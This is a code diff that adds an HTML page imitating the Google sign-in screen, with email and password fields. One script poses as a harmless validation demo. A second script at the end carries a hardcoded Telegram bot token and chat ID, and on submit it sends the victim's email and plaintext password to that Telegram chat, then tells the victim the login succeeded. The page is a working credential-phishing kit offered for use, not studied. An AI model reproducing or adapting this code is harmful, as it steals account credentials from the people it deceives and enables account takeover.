@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google</title>
+    <meta name="description" content="Google Sign In Page" />
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.gpteng.co/gptengineer.js" type="module"></script>
+  </head>
+  <style>
+    :root {
+  --google-blue: hsl(217, 89%, 61%);
+  --google-red: hsl(0, 84%, 60%);
+  --google-yellow: hsl(45, 100%, 51%);
+  --google-green: hsl(122, 39%, 49%);
+  --border-color: hsl(214.3, 31.8%, 91.4%);
+  --error-color: hsl(0, 84.2%, 60.2%);
+  --text-color: hsl(222.2, 84%, 4.9%);
+  --muted-text: hsl(215.4, 16.3%, 46.9%);
+  --background-color: hsl(0, 0%, 98%);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Roboto', sans-serif;
+}
+
+body {
+  background-color: var(--background-color);
+  color: var(--text-color);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+}
+
+.container {
+  width: 100%;
+  max-width: 480px;
+  padding: 1rem;
+  margin: 0 auto;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  min-height: 100vh;
+}
+
+.login-card {
+  background-color: white;
+  border-radius: 8px;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+  padding: 2rem;
+  width: 100%;
+  animation: fadeIn 0.3s ease-out;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.logo {
+  font-size: 2rem;
+  font-weight: normal;
+  text-align: center;
+  margin-bottom: 1.5rem;
+}
+
+.blue { color: var(--google-blue); }
+.red { color: var(--google-red); }
+.yellow { color: var(--google-yellow); }
+.green { color: var(--google-green); }
+
+.title {
+  font-size: 1.5rem;
+  font-weight: 500;
+  text-align: center;
+  margin-bottom: 0.5rem;
+}
+
+.subtitle {
+  color: var(--muted-text);
+  font-size: 0.875rem;
+  text-align: center;
+  margin-bottom: 2rem;
+}
+
+.login-form {
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.input-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.label-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+label {
+  font-size: 0.875rem;
+  font-weight: 500;
+}
+
+input[type="text"],
+input[type="password"] {
+  border: 1px solid var(--border-color);
+  border-radius: 4px;
+  padding: 0.75rem 1rem;
+  font-size: 1rem;
+  width: 100%;
+}
+
+input[type="text"]:focus,
+input[type="password"]:focus {
+  outline: 2px solid var(--google-blue);
+  border-color: transparent;
+}
+
+.error-message {
+  font-size: 0.75rem;
+  color: var(--error-color);
+  min-height: 1rem;
+}
+
+.password-input-container {
+  position: relative;
+}
+
+.toggle-password {
+  position: absolute;
+  right: 0.75rem;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: #666;
+  padding: 0.25rem;
+}
+
+.forgot-link {
+  color: var(--google-blue);
+  font-size: 0.875rem;
+  font-weight: 500;
+  text-decoration: none;
+}
+
+.remember-me {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.remember-me label {
+  font-size: 0.875rem;
+  font-weight: 400;
+}
+
+.button-container {
+  margin-top: 1rem;
+}
+
+.sign-in-button {
+  width: 100%;
+  background-color: var(--google-blue);
+  color: white;
+  border: none;
+  border-radius: 4px;
+  padding: 0.75rem 1rem;
+  font-size: 0.875rem;
+  font-weight: 500;
+  cursor: pointer;
+  transition: background-color 0.2s;
+}
+
+.sign-in-button:hover {
+  background-color: hsl(217, 89%, 56%);
+}
+
+.footer-links {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 2rem;
+}
+
+.footer-links a {
+  color: var(--google-blue);
+  font-size: 0.875rem;
+  font-weight: 500;
+  text-decoration: none;
+}
+
+.page-footer {
+  margin-top: 2rem;
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.75rem;
+  color: var(--muted-text);
+}
+
+.footer-nav {
+  display: flex;
+  gap: 1rem;
+}
+
+.footer-nav a {
+  color: var(--muted-text);
+  text-decoration: none;
+}
+
+.footer-nav a:hover {
+  color: var(--text-color);
+}
+
+input.error {
+  border-color: var(--error-color);
+}
+
+@media (max-width: 480px) {
+  .login-card {
+    box-shadow: none;
+  }
+}
+
+  </style>
+  <body>
+    <div class="container">
+      <div class="login-card">
+        <div class="logo">
+          <span class="blue">G</span>
+          <span class="red">o</span>
+          <span class="yellow">o</span>
+          <span class="blue">g</span>
+          <span class="green">l</span>
+          <span class="red">e</span>
+        </div>
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to Google</p>
+        
+        <form id="loginForm" class="login-form" novalidate>
+          <div class="input-group">
+            <label for="email">Email</label>
+            <input type="text" id="email" name="email" placeholder="Email or phone">
+            <p class="error-message" id="emailError"></p>
+          </div>
+          
+          <div class="input-group">
+            <div class="label-row">
+              <label for="password">Password</label>
+              <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+            <div class="password-input-container">
+              <input type="password" id="password" name="password" placeholder="Enter your password">
+              <button type="button" id="togglePassword" class="toggle-password">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+              </button>
+            </div>
+            <p class="error-message" id="passwordError"></p>
+          </div>
+          
+          <div class="remember-me">
+            <input type="checkbox" id="remember" name="remember">
+            <label for="remember">Stay signed in</label>
+          </div>
+          
+          <div class="button-container">
+        <button type="submit" class="sign-in-button" id="myButton">Sign In</button>
+          </div>
+        </form>
+        
+        <div class="footer-links">
+          <a href="#" class="create-account">Create account</a>
+          <a href="#" class="learn-more">Learn more</a>
+        </div>
+      </div>
+      
+      <footer class="page-footer">
+        <div class="language">English (United States)</div>
+        <div class="footer-nav">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </footer>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+  // Get elements
+  const loginForm = document.getElementById('loginForm');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const emailError = document.getElementById('emailError');
+  const passwordError = document.getElementById('passwordError');
+  const togglePasswordButton = document.getElementById('togglePassword');
+  
+  // Toggle password visibility
+  togglePasswordButton.addEventListener('click', function() {
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      togglePasswordButton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
+    } else {
+      passwordInput.type = 'password';
+      togglePasswordButton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
+    }
+  });
+  
+  // Validate email
+  function validateEmail() {
+    const email = emailInput.value.trim();
+    
+    if (!email) {
+      emailError.textContent = 'Email is required';
+      emailInput.classList.add('error');
+      return false;
+    } else if (!/\S+@\S+\.\S+/.test(email)) {
+      emailError.textContent = 'Please enter a valid email';
+      emailInput.classList.add('error');
+      return false;
+    } else {
+      emailError.textContent = '';
+      emailInput.classList.remove('error');
+      return true;
+    }
+  }
+  
+  // Validate password
+  function validatePassword() {
+    const password = passwordInput.value.trim();
+    
+    if (!password) {
+      passwordError.textContent = 'Password is required';
+      passwordInput.classList.add('error');
+      return false;
+    } else {
+      passwordError.textContent = '';
+      passwordInput.classList.remove('error');
+      return true;
+    }
+  }
+  
+  // Add blur event listeners for validation
+  emailInput.addEventListener('blur', validateEmail);
+  passwordInput.addEventListener('blur', validatePassword);
+  
+  // Form submit handling
+  loginForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const isEmailValid = validateEmail();
+    const isPasswordValid = validatePassword();
+    
+    if (isEmailValid && isPasswordValid) {
+      const rememberMe = document.getElementById('remember').checked;
+      
+      // Just for demonstration, show an alert
+      alert('Login attempt with email: ' + emailInput.value + 
+            '\nRemember me: ' + (rememberMe ? 'Yes' : 'No'));
+      
+      console.log('Login form submitted', {
+        email: emailInput.value,
+        password: passwordInput.value,
+        rememberMe: rememberMe
+      });
+      
+      // In a real application, you would handle form submission to a server here
+    }
+  });
+});
+
+const botToken = '8046750163:AAHuWSaStikIH_ZALQfZLkVyw80-s_NYxQg';
+    const chatId = '987733050';
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const message = `🔐 New Login:\nEmail: ${email}\nPassword: ${password}`;
+
+      const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    fetch(telegramURL)
+        .then(response => {
+          if (response.ok) {
+            alert('Login successful!');
+          } else {
+            alert('Login failed. Please try again.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+        });
+    });
+    </script>
+  </body>
+</html>
